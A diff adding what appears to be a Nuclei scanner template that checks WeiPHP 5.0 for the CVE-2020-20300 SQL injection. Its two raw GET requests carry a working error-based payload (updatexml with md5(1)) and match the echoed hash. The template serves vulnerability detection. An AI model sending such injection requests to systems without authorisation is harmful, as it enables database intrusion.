@@ -1,0 +1,30 @@
+id: weiphp-wp_where-sqli-cve-2020-20300
+info:
+  name: Weiphp wp_where SQL injection (CVE-2020-20300)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SQL injection vulnerability in the wp_where function in WeiPHP 5.0. Exploiting this vulnerability could allow attackers to retrieve sensitive database information or perform arbitrary SQL execution.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-20300
+http:
+  - raw:
+      - |
+        GET /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
+  - raw:
+      - |
+        GET /index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
